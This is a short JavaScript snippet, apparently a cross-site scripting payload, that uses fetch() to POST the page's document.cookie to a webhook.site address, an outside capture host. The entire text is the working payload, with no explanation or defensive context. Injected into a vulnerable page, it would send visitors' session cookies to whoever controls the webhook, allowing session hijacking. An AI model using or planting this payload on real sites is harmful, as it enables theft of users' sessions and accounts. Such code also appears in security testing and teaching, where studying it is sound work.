
fetch('https://webhook.site/a1fdd887-7bbc-44bd-b880-2aaf66a83b7e', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'cookie=' + encodeURIComponent(document.cookie)
});
